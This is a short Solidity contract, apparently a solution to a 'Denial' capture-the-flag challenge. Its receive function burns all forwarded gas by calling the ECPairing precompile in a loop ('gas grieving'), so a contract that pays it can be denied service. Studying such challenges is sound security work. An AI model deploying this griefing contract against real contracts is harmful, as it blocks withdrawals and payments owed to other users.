// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SolveDenial {
    address constant ECPairingAddr = 0x0000000000000000000000000000000000000008;

    // allow deposit of funds
    receive() external payable {
        // value copied from https://www.evm.codes/precompiled?fork=osaka#0x08
        uint256[12] memory inputs = [
            0x2cf44499d5d27bb186308b7af7af02ac5bc9eeb6a3d147c186b21fb1b76e18da,
            0x2c0f001f52110ccfe69108924926e45f0b0c868df0e7bde1fe16d3242dc715f6,
            0x1fb19bb476f6b9e44e2a32234da8212f61cd63919354bc06aef31e3cfaff3ebc,
            0x22606845ff186793914e03e21df544c34ffe2f2f3504de8a79d9159eca2d98d9,
            0x2bd368e28381e8eccb5fa81fc26cf3f048eea9abfdd85d7ed3ab3698d63e4f90,
            0x2fe02e47887507adf0ff1743cbac6ba291e66f59be6bd763950bb16041a0a85e,
            0x0000000000000000000000000000000000000000000000000000000000000001,
            0x30644e72e131a029b85045b68181585d97816a916871ca8d3c208c16d87cfd45,
            0x1971ff0471b09fa93caaf13cbf443c1aede09cc4328f5a62aad45f40ec133eb4,
            0x091058a3141822985733cbdddfed0fd8d6c104e9e9eff40bf5abfef9ab163bc7,
            0x2a23af9a5ce2ba2796c1f4e453a370eb0af8c212d9dc9acd8fc02c2e907baea2,
            0x23a8eb0b0996252cb548a4487da97b02422ebc0e834613f954de6c7e0afdc1fc
        ];

        bytes memory inputData = abi.encodePacked(inputs);

        // gas grieving
        while(gasleft() > 0) {
            // Use staticcall for a view operation
            (bool callSuccess, bytes memory returndata) = ECPairingAddr.staticcall(inputData);

            require(callSuccess, "ECPairing precompile call failed");
            require(returndata.length == 32, "Invalid return data length");
        }
    }
}
